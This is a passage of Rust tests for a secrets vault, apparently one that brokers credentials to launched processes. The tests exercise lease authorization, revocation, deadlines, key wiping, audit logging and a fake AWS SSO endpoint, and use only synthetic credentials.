            assert!(f.records().iter().any(|r| r["action"] == "launch-auth" && r["detail"]["context"] == context));
        }
    }

    #[test]
    fn launch_fresh_open_auth_redeem_and_blocked_containment() {
        use std::sync::{atomic::{AtomicUsize, Ordering}, mpsc};
        for mode in ["positive", "multiple", "mixed", "cached-mixed", "cached-deny", "cached-cancel", "cached-expired", "deny", "cancel", "revoke", "revision", "deadline", "death", "policy", "config", "binding", "intent"] {
            let cached = mode.starts_with("cached-");
            let f = Fixture::human_cached();
            if !cached {
                f.st.lock().unwrap().human.clear();
                crate::platform::helper::ECDH_HOOK.with(|h| h.borrow_mut().take());
                f.policy(store::Tier::Open, false, false);
            }
            let mut req = f.req();
            if let Req::LaunchPrepare { refs, env, .. } = &mut req {
                if cached || matches!(mode, "multiple" | "mixed") {
                    let v = peer_vault(&f.p, &f.peer).unwrap();
                    let file = v.build_file("test/second", store::Tier::Open, false, mode == "mixed",
                        &crate::crypto::new_dek(), &test_value(), &v.pubkeys_local().unwrap(), None).unwrap();
                    store::save_secret(&f.p, &file).unwrap();
                    refs.push("test/second".into()); env.insert("SECOND".into(), "test/second".into());
                } else { env.insert("ALIAS".into(), "test/ref".into()); }
            }
            let prepared = f.send(req).unwrap();
            assert!(prepared["expires_at"].as_u64().unwrap() > now() + 115);
            assert_eq!(f.st.lock().unwrap().human.len(), usize::from(cached));
            assert!(f.st.lock().unwrap().human.values().all(|h| h.uses == 0));
            assert!(f.st.lock().unwrap().leases.is_empty());
            let proof_expiry = if mode == "deadline" { now() + 10 } else { prepared["expires_at"].as_u64().unwrap() };
            if mode == "deadline" {
                // Bind captures the worker deadline, so shortening after Bind
                // cannot test its timeout. Allow real-process startup under load;
                // still require socket refusal before releasing the blocked AUTH.
                f.st.lock().unwrap().pending_launches.test_deadline(prepared["id"].as_str().unwrap(), proof_expiry);
            }
            let (entered_tx, entered_rx) = mpsc::sync_channel(1);
            let (release_tx, release_rx) = mpsc::sync_channel(1);
            let (returned_tx, returned_rx) = mpsc::sync_channel(1);
            let prompts = Arc::new(AtomicUsize::new(0));
            let count = prompts.clone(); let st = f.st.clone(); let p = f.p.clone();
            let setup: LaunchAuthSetup = Box::new(move |reason| {
                let Prompt::Use { names, caller: _, context } = reason else { panic!("wrong prompt kind"); };
                assert!(names.contains("test/ref"));
                if cached || matches!(mode, "multiple" | "mixed") { assert!(names.contains("test/second")); }
                assert_eq!(context, "/usr/bin/true");
                crate::platform::helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move || {
                    assert!(st.try_lock().is_ok(), "State held across AUTH");
                    assert_eq!(st.lock().unwrap().human.len(), usize::from(cached));
                    let events = crate::audit::read(&p, usize::MAX).unwrap();
                    assert_eq!(events.last().unwrap()["action"], "launch-auth");
                    assert_eq!(events.last().unwrap()["phase"], "intent");
                    count.fetch_add(1, Ordering::SeqCst);
                    entered_tx.send(()).unwrap();
                    release_rx.recv_timeout(Duration::from_secs(if mode == "deadline" { 20 } else { 10 })).unwrap();
                    returned_tx.send(()).unwrap();
                    if matches!(mode, "deny" | "cached-deny") { bail!("synthetic denial"); }
                    Ok(())
                })));
            });
            let fault = (mode == "intent").then_some("redeem-auth-audit");
            let mut shim = Shim::start_auth(&f, json!({"op":"launch_bind","id":prepared["id"]}), false, fault, Some(setup));
            assert_eq!(shim.response(), "bound", "mode={mode} expiry={proof_expiry} bind_now={}", now());
            let positive = matches!(mode, "positive" | "multiple" | "mixed" | "cached-mixed");
            shim.child.stdin.take().unwrap().write_all(if positive { b"r" } else { b"n" }).unwrap();
            if mode != "intent" {
                entered_rx.recv_timeout(Duration::from_secs(5)).unwrap_or_else(|e| panic!("{mode}: {e}"));
                assert_eq!(opens(&shim), 0);
                match mode {
                    "cancel" | "cached-cancel" => { f.send(Req::LaunchCancel { id: prepared["id"].as_str().unwrap().into() }).unwrap(); }
                    "revoke" => { f.send(Req::Revoke { patterns: vec!["*".into()] }).unwrap(); }
                    "revision" => { f.st.lock().unwrap().lease_revision += 1; }
                    "cached-expired" => { f.st.lock().unwrap().human.values_mut().next().unwrap().info.expires = now(); }
                    "policy" => f.policy(store::Tier::Open, true, false),
                    "config" => {
                        let mut cfg = store::load_config(&f.p).unwrap();
                        cfg.agent_process_names.push(Path::new(&agent::proc_exe(unsafe { libc::getppid() }).unwrap()).file_name().unwrap().to_str().unwrap().into());
                        cfg.removed_defaults.clear();
                        store::save_config(&f.p, &cfg).unwrap();
                    }
                    "binding" => { std::fs::rename(&f.p.root, f.p.root.with_extension("moved")).unwrap(); }
                    "death" => { shim.child.kill().unwrap(); let _ = shim.child.wait(); }
                    "deadline" => {
                        assert!(shim.child.wait().unwrap().success(), "must refuse before AUTH returns");
                        shim.handler.take().unwrap().join().unwrap();
                        assert!(!bound(&f)); assert_eq!(opens(&shim), 0);
                    }
                    _ => {},
                }
                if mode == "deadline" {
                    while now() <= proof_expiry { std::thread::sleep(Duration::from_millis(10)); }
                    assert!(now() > proof_expiry, "mode={mode} expiry={proof_expiry} release_now={}", now());
                }
                release_tx.send(()).unwrap_or_else(|e| panic!("mode={mode} expiry={proof_expiry} release_now={}: {e}", now()));
                returned_rx.recv_timeout(Duration::from_secs(5)).unwrap();
            }
            if mode != "deadline" {
                if mode != "death" { assert!(shim.child.wait().unwrap().success(), "{mode}"); }
                shim.handler.take().unwrap().join().unwrap();
            }
            if mode == "binding" {
                if f.p.root.exists() { std::fs::remove_dir_all(&f.p.root).unwrap(); }
                std::fs::rename(f.p.root.with_extension("moved"), &f.p.root).unwrap();
            }
            assert_eq!(prompts.load(Ordering::SeqCst), usize::from(mode != "intent"), "{mode}");
            assert_eq!(opens(&shim), if positive { if mode == "positive" { 1 } else { 2 } } else { 0 }, "{mode}");
            assert_eq!(f.st.lock().unwrap().human.len(), usize::from(cached), "Open AUTH must not seed the human cache");
            assert_eq!(f.st.lock().unwrap().human.values().map(|h| h.uses).sum::<u32>(), u32::from(mode == "cached-mixed"));
            assert!(f.st.lock().unwrap().leases.values().all(|h| h.uses == 0));
            assert!(!bound(&f));
        }
    }

    #[test]
    fn launch_fresh_bio_batch_and_containment() {
        use std::sync::{atomic::{AtomicUsize, Ordering}, mpsc};
        for mode in ["positive", "multiple", "open-mixed", "cached-mixed", "unanchored", "public", "allowed", "cache-disabled", "deny", "cached-deny", "cancel", "revoke", "deadline", "death", "replacement", "intent", "corrupt", "multiple-corrupt", "late-revoke"] {
            let mut f = Fixture::human_cached();
            let cached = mode.starts_with("cached-");
            if !cached { f.st.lock().unwrap().human.clear(); }
            if mode == "unanchored" { f.peer.anchor = None; f.peer.ancestors.clear(); }
            let mut cfg = store::load_config(&f.p).unwrap();
            cfg.human_lease_hours = if mode == "cache-disabled" { 0.0 } else { 8.0 }; // population must use legacy three-hour clamp
            store::save_config(&f.p, &cfg).unwrap();
            if matches!(mode, "public" | "allowed") { f.policy(store::Tier::Bio, mode == "allowed", mode == "public"); }
            let mut req = f.req();
            let multiple = cached || matches!(mode, "multiple" | "open-mixed" | "multiple-corrupt");
            // Payload corruption the wrapped DEK does not authenticate: unwrap and the
            // prompt succeed, open fails; no fresh human-cache entry may survive (legacy parity).
            let corrupt = |f: &Fixture, name: &str| {
                let mut file = store::load_secret(&f.p, name).unwrap();
                file.nonce = String::new();
                store::save_secret(&f.p, &file).unwrap();
            };
            if mode == "corrupt" { corrupt(&f, "test/ref"); }
            if let Req::LaunchPrepare { refs, env, .. } = &mut req {
                if multiple {
                    let v = peer_vault(&f.p, &f.peer).unwrap();
                    let tier = if mode == "open-mixed" { store::Tier::Open } else { store::Tier::Bio };
                    let file = v.build_file("test/second", tier, false, false,
                        &crate::crypto::new_dek(), &test_value(), &v.pubkeys_local().unwrap(), None).unwrap();
                    store::save_secret(&f.p, &file).unwrap();
                    if mode == "multiple-corrupt" { corrupt(&f, "test/second"); }
                    refs.push("test/second".into()); env.insert("SECOND".into(), "test/second".into());
                } else { env.insert("ALIAS".into(), "test/ref".into()); }
            }
            let prepared = f.send(req).unwrap();
            assert!(prepared["expires_at"].as_u64().unwrap() > now() + 115);
            let proof_expiry = if mode == "deadline" { now() + 10 } else { prepared["expires_at"].as_u64().unwrap() };
            if mode == "deadline" {
                f.st.lock().unwrap().pending_launches.test_deadline(prepared["id"].as_str().unwrap(), proof_expiry);
            }
            let (entered_tx, entered_rx) = mpsc::sync_channel(1);
            let (release_tx, release_rx) = mpsc::sync_channel(1);
            let (wiped_tx, wiped_rx) = mpsc::sync_channel(1);
            let prompts = Arc::new(AtomicUsize::new(0));
            let count = prompts.clone(); let st = f.st.clone(); let p = f.p.clone();
            let setup: LaunchAuthSetup = Box::new(move |reason| {
                let Prompt::Use { names, caller, context } = reason else { panic!("wrong prompt kind"); };
                assert!(!caller.is_empty()); assert!(names.contains("test/ref"));
                if multiple { assert!(names.contains("test/second")); }
                assert_eq!(context, "/usr/bin/true");
                LAUNCH_LATE_WIPE.with(|h| *h.borrow_mut() = Some(Box::new(move |deks| {
                    assert!(!deks.is_empty());
                    assert!(deks.iter().all(|d| d.iter().all(|b| *b == 0)), "late DEKs must be wiped");
                    wiped_tx.send(()).unwrap();
                })));
                crate::platform::helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|| panic!("Bio proof must suppress AUTH"))));
                crate::platform::helper::ECDH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |reqs| {
                    assert!(st.try_lock().is_ok(), "State held during Bio unwrap");
                    assert!(LAUNCH_CAP.with(|cap| cap.borrow().is_some()));
                    let events = crate::audit::read(&p, usize::MAX).unwrap();
                    assert_eq!(events.last().unwrap()["action"], "launch-auth");
                    assert_eq!(events.last().unwrap()["phase"], "intent");
                    assert_eq!(reqs.len(), if matches!(mode, "multiple" | "multiple-corrupt") { 2 } else { 1 });
                    assert!(reqs.iter().all(|(key, _)| *key == store::KeyId::Bio));
                    count.fetch_add(1, Ordering::SeqCst);
                    entered_tx.send(()).unwrap();
                    release_rx.recv_timeout(Duration::from_secs(if mode == "deadline" { 20 } else { 10 })).unwrap();
                    if matches!(mode, "deny" | "cached-deny") { bail!("synthetic Bio denial"); }
                    let sk = p256::SecretKey::from_slice(&[7; 32]).unwrap();
                    reqs.iter().map(|(_, eph)| {
                        let pk = p256::PublicKey::from_sec1_bytes(&B64.decode(eph)?)?;
                        Ok(Zeroizing::new(p256::ecdh::diffie_hellman(sk.to_nonzero_scalar(), pk.as_affine()).raw_secret_bytes().to_vec()))
                    }).collect()
                })));
            });
            let mut shim = Shim::start_auth(&f, json!({"op":"launch_bind","id":prepared["id"]}), false,
                match mode { "intent" => Some("redeem-auth-audit"), "late-revoke" => Some("revoke-before-cache"), _ => None }, Some(setup));
            assert_eq!(shim.response(), "bound", "mode={mode} expiry={proof_expiry} bind_now={}", now());
            let positive = matches!(mode, "late-revoke" | "positive" | "multiple" | "open-mixed" | "cached-mixed" | "unanchored" | "public" | "allowed" | "cache-disabled");
            shim.child.stdin.take().unwrap().write_all(if positive { b"r" } else { b"n" }).unwrap();
            if mode != "intent" {
                entered_rx.recv_timeout(Duration::from_secs(5)).unwrap_or_else(|e| panic!("{mode}: {e}"));
                assert_eq!(opens(&shim), 0);
                assert_eq!(f.st.lock().unwrap().human.len(), usize::from(cached));
                match mode {
                    "cancel" => { f.send(Req::LaunchCancel { id: prepared["id"].as_str().unwrap().into() }).unwrap(); }
                    "revoke" => { f.send(Req::Revoke { patterns: vec!["*".into()] }).unwrap(); }
                    "replacement" => f.policy(store::Tier::Bio, false, false),
                    "death" => { shim.child.kill().unwrap(); let _ = shim.child.wait(); }
                    "deadline" => {
                        assert!(shim.child.wait().unwrap().success(), "refuse before Bio returns");
                        shim.handler.take().unwrap().join().unwrap();
                        assert_eq!(opens(&shim), 0); assert!(!bound(&f));
                    }
                    _ => {},
                }
                if mode == "deadline" {
                    while now() <= proof_expiry { std::thread::sleep(Duration::from_millis(10)); }
                    assert!(now() > proof_expiry, "mode={mode} expiry={proof_expiry} release_now={}", now());
                }
                release_tx.send(()).unwrap_or_else(|e| panic!("mode={mode} expiry={proof_expiry} release_now={}: {e}", now()));
                if mode == "deadline" { wiped_rx.recv_timeout(Duration::from_secs(5)).unwrap(); }
            }
            if mode != "deadline" {
                if mode != "death" { assert!(shim.child.wait().unwrap().success(), "{mode}"); }
                shim.handler.take().unwrap().join().unwrap();
            }
            assert_eq!(prompts.load(Ordering::SeqCst), usize::from(mode != "intent"), "{mode}");
            if mode.ends_with("corrupt") { assert!(opens(&shim) >= 1, "{mode}"); }
            else { assert_eq!(opens(&shim), if positive { if multiple { 2 } else { 1 } } else { 0 }, "{mode}"); }
            let g = f.st.lock().unwrap();
            let expected = if mode == "cached-deny" { 1 } else if !positive || matches!(mode, "late-revoke" | "unanchored" | "public" | "allowed" | "cache-disabled") { 0 } else if matches!(mode, "multiple" | "cached-mixed") { 2 } else { 1 };
            assert_eq!(g.human.len(), expected, "{mode}");
            assert_eq!(g.human.values().map(|h| h.uses).sum::<u32>(), u32::from(mode == "cached-mixed"));
            for h in g.human.values().filter(|h| h.uses == 0 && mode != "cached-deny") {
                assert_eq!(h.info.to, Grantee::Human);
                assert_eq!(h.info.expires - h.info.granted, 3 * 3600);
            }
            assert!(g.leases.values().all(|h| h.uses == 0));
            drop(g); assert!(!bound(&f));
        }
    }

    #[test]
    fn launch_human_cached_redeem_and_live_refusals() {
        for mode in ["positive", "expired", "cache-env", "cache-anchor", "cache-screen", "config", "cancel", "revoke"] {
            let f = Fixture::human_cached();
            let prepared = redeem_prepare(&f);
            assert!(prepared["expires_at"].as_u64().unwrap() <= now() + 30);
            assert_eq!(f.st.lock().unwrap().human.values().next().unwrap().uses, 0);
            let fault = match mode {
                "cache-env" => Some("cache-env"), "cache-anchor" => Some("cache-anchor"), "cache-screen" => Some("cache-screen"),
                "cancel" => Some("redeem-cancel"), "revoke" => Some("redeem-revoke"), _ => None,
            };
            let mut shim = redeem_shim(&f, &prepared, fault);
            if mode == "expired" { f.st.lock().unwrap().human.values_mut().next().unwrap().info.expires = now(); }
            if mode == "config" {
                let mut cfg = store::load_config(&f.p).unwrap(); cfg.human_lease_hours = 0.0;
                store::save_config(&f.p, &cfg).unwrap();
            }
            shim.finish(if mode == "positive" { b'r' } else { b'n' });
            assert_eq!(opens(&shim), usize::from(mode == "positive"), "{mode}");
            assert!(!bound(&f));
            assert_eq!(f.st.lock().unwrap().human.values().map(|h| h.uses).sum::<u32>(), u32::from(mode == "positive"), "{mode}");
            if mode == "positive" {
                let records = f.records();
                for action in ["launch-prepare", "launch-redeem"] {
                    let intent = records.iter().find(|e| e["action"] == action && e["phase"] == "intent").unwrap();
                    assert_eq!(intent["detail"]["decisions"]["test/ref"], "human_cached");
                }
            }
        }
    }

    #[test]
    fn launch_human_cached_prepare_requires_d10_eligibility() {
        for mode in ["positive", "expired", "env", "anchor", "ancestry", "config", "screen"] {
            let mut f = Fixture::human_cached();
            match mode {
                "expired" => f.st.lock().unwrap().human.values_mut().next().unwrap().info.expires = now(),
                "env" => f.peer.caller.env_unknown = true,
                "anchor" => f.peer.anchor = Some((11, 20)),
                "ancestry" => f.peer.ancestors.clear(),
                "config" => {
                    let mut cfg = store::load_config(&f.p).unwrap(); cfg.human_lease_hours = 0.0;
                    store::save_config(&f.p, &cfg).unwrap();
                }
                "screen" => crate::platform::helper::ECDH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|_| bail!("synthetic locked screen")))),
                _ => {},
            }
            let result = f.send(f.req());
            if mode == "screen" { assert!(result.is_err()); continue; }
            let prepared = result.unwrap();
            assert!(prepared["id"].is_string());
            let records = f.records();
            let intent = records.iter().find(|e| e["action"] == "launch-prepare" && e["phase"] == "intent").unwrap();
            assert_eq!(intent["detail"]["decisions"]["test/ref"], if mode == "positive" { "human_cached" } else { "needs_fresh_auth" }, "{mode}");
            assert!(f.st.lock().unwrap().human.values().all(|h| h.uses == 0));
        }
    }

    #[test]
    fn launch_redeem_nonlease_positive_and_audit() {
        for (human, public, agent_key) in [
            (false, true, false), (false, false, false), (true, true, false), (true, false, false),
            (false, true, true), (false, false, true), (true, true, true), (true, false, true),
        ] {
            let mut f = Fixture::redeem();
            if agent_key {
                // Synthetic marker and software public key only; no real helper.
                store::write_atomic(&f.p.keys().join("agent.key"), b"synthetic marker").unwrap();
                let mut pk: Value = serde_json::from_slice(&std::fs::read(f.p.pubkeys()).unwrap()).unwrap();
                pk["agent"] = pk["open"].clone();
                store::write_atomic(&f.p.pubkeys(), &serde_json::to_vec(&pk).unwrap()).unwrap();
            }
            if human {
                let mut cfg = store::Config::default();
                cfg.agent_process_names.clear(); cfg.agent_env_markers.clear();
                cfg.removed_defaults = store::DEFAULT_AGENT_PROCESS_NAMES.iter().chain(store::DEFAULT_AGENT_ENV_MARKERS).map(|s| (*s).into()).collect();
                store::save_config(&f.p, &cfg).unwrap();
                f.peer = agent::detect_peer(&cfg, std::process::id() as i32);
                assert!(!f.peer.caller.is_agent());
            }
            f.policy(store::Tier::Open, !public, public);
            assert_eq!(store::load_secret(&f.p, "test/ref").unwrap().key_id().unwrap(),
                if agent_key { store::KeyId::Agent } else { store::KeyId::Open });
            f.st.lock().unwrap().leases.clear();
            let prepared = redeem_prepare(&f);
            let mut shim = redeem_shim(&f, &prepared, None); shim.finish(b'r');
            assert_eq!(opens(&shim), 1); assert!(!bound(&f));
            let records = f.records();
            let intent = records.iter().find(|e| e["action"] == "launch-redeem" && e["phase"] == "intent").unwrap();
            assert_eq!(intent["detail"]["decisions"]["test/ref"], if public { "open_public" } else { "agent_allowed" });
        }
    }

    #[test]
    fn launch_redeem_changed_policy_kind_and_nonlease_containment_refuse() {
        for mode in ["policy", "kind", "caller", "cancel", "revoke", "intent", "unwrap"] {
            let mut f = Fixture::redeem(); f.policy(store::Tier::Open, false, true);
            // Prepare-time classification differs from the freshly detected owner.
            if mode == "caller" { f.peer.caller.env_unknown = !f.peer.caller.env_unknown; }
            f.st.lock().unwrap().leases.clear();
            let prepared = redeem_prepare(&f);
            let fault = match mode { "cancel" => Some("redeem-cancel"), "revoke" => Some("redeem-revoke"), "intent" => Some("redeem-intent"), "unwrap" => Some("redeem-unwrap"), _ => None };
            let mut shim = redeem_shim(&f, &prepared, fault);
            if mode == "policy" { f.policy(store::Tier::Bio, false, false); }
            if mode == "kind" { f.policy(store::Tier::Open, true, false); }
            shim.finish(b'n'); assert_eq!(opens(&shim), 0, "{mode}"); assert!(!bound(&f));
        }
    }

    #[test]
    fn launch_redeem_positive_replay_fresh_and_one_use_per_lease() {
        for action in *b"rpv" {
            let f = Fixture::redeem(); let prepared = redeem_prepare(&f);
            let mut shim = redeem_shim(&f, &prepared, (action == b'v').then_some("fresh"));
            shim.finish(action);
            assert_eq!(opens(&shim), 1);
            assert_eq!(f.st.lock().unwrap().leases["test/ref"].uses, 1);
            assert!(!bound(&f));
            let records = f.records();
            let intent = records.iter().find(|e| e["action"] == "launch-redeem" && e["phase"] == "intent").unwrap();
            assert_eq!(intent["detail"]["owner"]["pid"], f.peer.pid);
            assert_eq!(intent["detail"]["shim"]["pid"], shim.child.id());
            assert!(intent["detail"]["target"]["sha256"].as_str().is_some_and(|s| s.len()==64));
            assert!(intent["detail"].get("script").is_some());
        }
    }

    #[test]
    fn launch_redeem_wrong_token_burns_before_correct_retry() {
        let f = Fixture::redeem(); let prepared = redeem_prepare(&f);
        let mut shim = redeem_shim(&f, &prepared, None); shim.finish(b'w');
        assert_eq!(opens(&shim), 0); assert!(!bound(&f));
        assert_eq!(f.st.lock().unwrap().leases["test/ref"].uses, 0);
        assert!(f.send(Req::LaunchRedeem { token: B64.encode([0;32]) }).is_err());
    }

    #[test]
    fn launch_redeem_refuses_contained_or_changed_authority() {
        for mode in ["revoke", "cancel", "deadline", "expired-lease", "grantee", "scope", "uses", "revision"] {
            let f = Fixture::redeem(); let prepared = redeem_prepare(&f);
            let mut shim = redeem_shim(&f, &prepared, None);
            match mode {
                "revoke" => { f.send(Req::Revoke { patterns: vec!["*".into()] }).unwrap(); }
                "cancel" => { f.send(Req::LaunchCancel { id: prepared["id"].as_str().unwrap().into() }).unwrap(); }
                "deadline" => { expire_launches(&f.p, &f.st, prepared["expires_at"].as_u64().unwrap()); }
                _ => {
                    let mut g = f.st.lock().unwrap();
                    if mode == "revision" { g.lease_revision += 1; }
                    let h = g.leases.get_mut("test/ref").unwrap();
                    match mode {
                        "expired-lease" => h.info.expires = now(),
                        "grantee" => h.info.to = Grantee::Human,
                        "scope" => h.scope.cmds.clear(),
                        "uses" => h.scope.max_uses = Some(0),
                        _ => (),
                    }
                }
            }
            shim.finish(b'n'); assert_eq!(opens(&shim), 0, "{mode}"); assert!(!bound(&f));
        }
    }

    #[test]
    fn launch_redeem_two_prepares_last_use_has_one_winner() {
        let f = Fixture::redeem();
        f.st.lock().unwrap().leases.get_mut("test/ref").unwrap().scope.max_uses = Some(1);
        let first = redeem_prepare(&f); let second = redeem_prepare(&f);
        let mut a = redeem_shim(&f, &first, None); let mut b = redeem_shim(&f, &second, None);
        // Both bound sessions race the same last lease use.
        a.child.stdin.take().unwrap().write_all(b"a").unwrap();
        b.child.stdin.take().unwrap().write_all(b"a").unwrap();
        for shim in [&mut a, &mut b] {
            assert!(shim.child.wait().unwrap().success());
            shim.handler.take().unwrap().join().unwrap();
        }
        let results: Vec<_> = [&a, &b].iter().map(|shim| std::fs::read_to_string(shim.ready.with_extension("result")).unwrap()).collect();
        assert_eq!(results.iter().filter(|r| *r == "released").count(), 1);
        assert_eq!(opens(&a)+opens(&b), 1);
        assert!(!f.st.lock().unwrap().leases.contains_key("test/ref"));
    }

    fn static_test_creds() -> crate::aws::AwsCreds {
        crate::aws::AwsCreds { access_key_id: "synthetic-access-canary".into(), secret_access_key: "synthetic-secret-canary".into(), session_token: Some("synthetic-session-canary".into()), region: Some("us-east-1".into()), session_mint: false }
    }

    fn aws_fixture(value: &[u8]) -> (Fixture, Req) {
        let f = Fixture::redeem();
        let v = peer_vault(&f.p, &f.peer).unwrap();
        let dek = crate::crypto::new_dek();
        let file = v.build_file("aws/static", store::Tier::Bio, false, false, &dek, value, &v.pubkeys_local().unwrap(), None).unwrap();
        store::save_secret(&f.p, &file).unwrap();
        let mut held = f.st.lock().unwrap().leases.remove("test/ref").unwrap();
        held.info.name = "aws/static".into(); held.dek = dek;
        f.st.lock().unwrap().leases.insert("aws/static".into(), held);
        let req = Req::LaunchPrepare { allow_hosts: vec![], jail: false, refs: vec!["aws/static".into()], env: Default::default(), target: "/usr/bin/true".into(), argv: vec!["/usr/bin/true".into()], cwd: f.p.root.clone(), aws: Some("aws/static".into()), ambient_bytes: 0, no_redact: false };
        (f, req)
    }

    fn static_registration() -> crate::sso::SsoReg {
        serde_json::from_value(json!({"name":"aws/static", "tier":"open", "agent_allowed":true, "profile":{
            "portal":"synthetic", "start_url":"https://synthetic.invalid/start", "sso_region":"us-east-1", "account_id":"000000000000", "role_name":"synthetic", "region":"us-east-1"
        }})).unwrap()
    }

    #[cfg(debug_assertions)] // Reuses the existing debug-only SSO HTTP fake.
    fn sso_fixture(mode: &str) -> (Fixture, Req) {
        let mut reg = static_registration();
        reg.profile.sso_region = "us-west-2".into();
        let (mut f, req) = aws_fixture(&crate::sso::entry_json(&reg.profile).unwrap());
        let human = matches!(mode, "open" | "public" | "bio" | "cancel" | "revoke");
        if human {
            let mut cfg = store::Config::default();
            cfg.agent_process_names.clear(); cfg.agent_env_markers.clear();
            cfg.removed_defaults = store::DEFAULT_AGENT_PROCESS_NAMES.iter().chain(store::DEFAULT_AGENT_ENV_MARKERS).map(|s| (*s).into()).collect();
            store::save_config(&f.p, &cfg).unwrap();
            f.peer = agent::detect_peer(&cfg, f.peer.pid);
            assert!(!f.peer.caller.is_agent());
        }
        let dek = f.st.lock().unwrap().leases["aws/static"].dek.clone();
        reg.tier = if (human && mode != "bio") || mode == "agent-open" { store::Tier::Open } else { store::Tier::Bio };
        reg.agent_allowed = !human && mode != "agent-denied";
        reg.dek_sha256 = Some(crate::sso::sha256_hex(dek.as_ref()));
        if human || mode == "agent-open" {
            f.st.lock().unwrap().leases.clear();
            let v = peer_vault(&f.p, &f.peer).unwrap();
            let file = v.build_file("aws/static", reg.tier, reg.agent_allowed, matches!(mode, "public" | "cancel" | "revoke"),
                &dek, &crate::sso::entry_json(&reg.profile).unwrap(), &v.pubkeys_local().unwrap(), None).unwrap();
            store::save_secret(&f.p, &file).unwrap();
        }
        let mut sess = super::tests::session("bound-synthetic", 3600, None);
        sess.portal = reg.profile.portal.clone(); sess.start_url = reg.profile.start_url.clone(); sess.region = reg.profile.sso_region.clone();
        { let mut g = f.st.lock().unwrap(); g.sso.insert(sess.portal.clone(), sess); g.sso_profiles.insert(reg.name.clone(), reg); }
        f.sso_base = Some(super::tests::launch_fake_aws(mode == "mint-fail"));
        (f, req)
    }

    #[cfg(debug_assertions)] // Reuses the existing debug-only SSO HTTP fake.
    fn sso_auth_setup(f: &Fixture, kind: &'static str, prompts: Arc<Mutex<Vec<&'static str>>>, blocked: Option<(std::sync::mpsc::SyncSender<()>, std::sync::mpsc::Receiver<()>)>) -> LaunchAuthSetup {
        let st = f.st.clone(); let p = f.p.clone();
        Box::new(move |reason| {
            match (kind, reason) {
                ("sso", Prompt::SsoUse { name, account, role }) => {
                    assert_eq!(name, "aws/static"); assert_eq!(account, "000000000000"); assert_eq!(role, "synthetic");
                }
                ("use" | "bio", Prompt::Use { names, .. }) => assert_eq!(names, "aws/static"),
                _ => panic!("wrong SSO launch prompt"),
            }
            let proof = move || {
                assert!(st.try_lock().is_ok(), "State held across SSO proof");
                assert!(LAUNCH_CAP.with(|c| c.borrow().is_some()));
                let records = crate::audit::read(&p, usize::MAX).unwrap();
                assert_eq!(records.last().unwrap()["action"], "launch-auth");
                assert_eq!(records.last().unwrap()["phase"], "intent");
                prompts.lock().unwrap().push(kind);
                if let Some((entered, release)) = blocked {
                    entered.send(()).unwrap(); release.recv_timeout(Duration::from_secs(10)).unwrap();
                }
            };
            if kind == "bio" {
                crate::platform::helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|| panic!("Bio must not AUTH"))));
                crate::platform::helper::ECDH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |reqs| {
                    proof();
                    let sk = p256::SecretKey::from_slice(&[7;32]).unwrap();
                    reqs.iter().map(|(key, eph)| {
                        assert_eq!(*key, store::KeyId::Bio);
                        let pk = p256::PublicKey::from_sec1_bytes(&B64.decode(eph)?)?;
                        Ok(Zeroizing::new(p256::ecdh::diffie_hellman(sk.to_nonzero_scalar(), pk.as_affine()).raw_secret_bytes().to_vec()))
                    }).collect()
                })));
            } else {
                let reason = reason.clone();
                if kind == "sso" {
                    crate::platform::helper::CALL_AT_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|_, args| {
                        assert_eq!(args[0], "auth");
                        // Legacy SsoUse has exactly these three fields, no context.
                        assert_eq!(args[2], json!({"id":"sso_use","params":["aws/static","000000000000","synthetic"]}).to_string());
                        Ok(json!({}))
                    })));
                }
                crate::platform::helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move || {
                    proof();
                    if kind == "sso" { crate::platform::helper::auth(&reason)?; }
                    Ok(())
                })));
            }
        })
    }

    #[test]
    #[cfg(debug_assertions)]
    fn launch_sso_prompt_parity_and_endpoint() {
        for (mode, expected) in [("agent", vec![]), ("agent-open", vec![]), ("open", vec!["use"]), ("public", vec!["sso"]), ("bio", vec!["bio"])] {
            let (mut f, req) = sso_fixture(mode);
            let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
            f.http_port = listener.local_addr().unwrap().port();
            let st = f.st.clone(); let p = f.p.clone();
            let http = std::thread::spawn(move || { for _ in 0..2 { serve_aws(listener.accept().unwrap().0, &st, &p).unwrap(); } });
            let prepared = f.send(req).unwrap();
            assert_eq!(prepared.as_object().unwrap().len(), 2);
            assert!(f.st.lock().unwrap().aws.is_empty());
            assert!(f.st.lock().unwrap().sso_creds.is_empty(), "Prepare must not mint");
            let ttl = if expected.is_empty() { 30 } else { 120 };
            assert!((now()+ttl-2..=now()+ttl).contains(&prepared["expires_at"].as_u64().unwrap()), "{mode}");
            let prompts = Arc::new(Mutex::new(vec![]));
            let setups = expected.iter().map(|kind| sso_auth_setup(&f, kind, prompts.clone(), None)).collect();
            let mut shim = Shim::start_setups(&f, json!({"op":"launch_bind","id":prepared["id"]}), false, None, setups);
            assert_eq!(shim.response(), "bound");
            shim.child.stdin.as_mut().unwrap().write_all(b"S").unwrap();
            let until = Instant::now() + Duration::from_secs(10);
            while !std::fs::read_to_string(shim.ready.with_extension("result")).is_ok_and(|r| r == "aws-delivered") {
                assert!(shim.child.try_wait().unwrap().is_none(), "SSO shim exited: {mode}");
                assert!(Instant::now() < until, "SSO delivery timeout: {mode}");
                std::thread::sleep(Duration::from_millis(10));
            }
            http.join().unwrap();
            assert_eq!(*prompts.lock().unwrap(), expected, "{mode}");
            {
                let g = f.st.lock().unwrap(); assert_eq!(g.aws.len(), 1);
                let ep = g.aws.values().next().unwrap();
                assert_eq!(ep.sso.as_deref(), Some("aws/static"));
                assert_eq!(ep.binding.as_ref(), Some(&g.binding("aws/static").unwrap()));
                assert!(ep.creds.is_empty());
                assert!((12*3600-15..=12*3600).contains(&ep.expires.duration_since(Instant::now()).as_secs()));
                if mode == "agent" { assert_eq!(g.leases["aws/static"].uses, 1); }
            }
            shim.finish(b'e');
            assert!(f.st.lock().unwrap().aws.is_empty()); assert!(!bound(&f));
        }
    }

    #[test]
    #[cfg(debug_assertions)]
    fn launch_sso_registration_proof_and_mint_refusals() {
